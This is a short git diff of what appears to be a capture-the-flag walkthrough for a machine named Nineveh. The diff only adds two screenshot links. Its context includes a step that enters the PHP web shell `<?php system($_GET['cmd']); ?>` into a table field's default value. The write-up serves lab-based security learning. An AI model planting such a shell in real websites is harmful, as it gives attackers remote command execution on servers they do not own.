@@ -393,7 +393,7 @@ The table only need one field:
 
 <br />
 
-
+![10](../../../assets/images/Nineveh/10.png)
 
 <br />
 
@@ -404,6 +404,7 @@ Now we select the `"Type"` text, and enter the php code into the `"Default Value
 ```php
 <?php system($_GET['cmd']); ?>
 ```
+![11](../../../assets/images/Nineveh/11.png)
 
 
 <br />
